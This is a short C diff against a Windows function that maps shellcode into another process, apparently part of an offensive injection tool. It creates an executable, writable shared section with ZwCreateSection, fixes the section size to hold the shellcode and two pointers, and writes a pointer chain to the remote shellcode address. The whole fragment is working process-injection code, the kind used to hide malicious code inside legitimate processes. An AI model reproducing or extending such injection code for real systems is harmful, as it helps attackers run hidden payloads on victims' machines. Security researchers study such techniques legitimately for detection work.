@@ -11,7 +11,7 @@ PVOID map_code_and_addresses_into_process(HANDLE hProcess, LPBYTE shellcode, SIZ
 
     LARGE_INTEGER maxSize;
     maxSize.HighPart = 0;
-    maxSize.LowPart = sizeof(LPVOID) * 2; //we need space for 2 handles
+    maxSize.LowPart = sizeof(LONG) * 2 + shellcodeSize; //we need space for the shellcode and two pointers
     NTSTATUS status = NULL;
     if ((status = ZwCreateSection( &hSection, SECTION_ALL_ACCESS, NULL, &maxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != STATUS_SUCCESS)
     {
@@ -54,6 +54,7 @@ PVOID map_code_and_addresses_into_process(HANDLE hProcess, LPBYTE shellcode, SIZ
     LONG hop1 = (LONG) buf_va + sizeof(LONG);
     LONG shellc_va = (LONG) shellcode_remote_ptr;
 
+    //fill the pointers
     memcpy((BYTE*)handles_local_ptr, &hop1, sizeof(LONG));
     memcpy((BYTE*)handles_local_ptr + sizeof(LONG), &shellc_va, sizeof(LONG));
 
